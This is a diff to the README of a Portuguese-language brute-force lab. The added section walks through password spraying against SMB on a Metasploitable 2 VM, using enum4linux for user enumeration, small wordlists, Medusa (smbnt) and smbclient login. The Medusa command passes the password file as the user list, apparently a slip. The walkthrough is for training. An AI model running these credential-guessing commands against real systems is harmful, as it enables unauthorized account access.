@@ -101,9 +101,31 @@ Tudo certo, você conseguiu acesso ao sistema web.
 
 ## Password Spraying em SMB
 
+Vamos começar fazendo a enumeração dos serviços na vm Metasploitable 2 e extrair os usuários do serviço **SBM**, com os seguintes comandos:
+~~~bash
 enum4linux -a 192.168.56.102 | tee enum4_saida.txt
 cat enum4_saida.txt | grep 'user:'
+~~~
+
+![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_14-37-32.png)
+![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_14-39-58.png)
+
+Em seguida criaremos novos dicionários para o ataque de força bruta com o Medusa, comandos abaixo:
+~~~bash
 echo -e "user\nmsfadmin\nservice" > usuarios_smb.txt
 echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_smb.txt
+~~~
+
+![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_14-44-22.png)
+
+Por último vamos executar o ataque com o Medusa e usar a credencial encontrada para testar o acesso ao serviço **SMB**, comandos abaixo:
+~~~bash
 medusa -h 192.168.56.102 -U senhas_smb.txt -P senhas_smb.txt -M smbnt -t 2 -T 50 | grep 'ACCOUNT FOUND'
 smbclient -L //192.168.56.102 -U msfadmin
+~~~
+
+![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_14-55-33.png)
+
+Se o login for bem sucedido você verá um resultador similar a tela acima, tudo ok, deu certo!
+
+## Mitigações
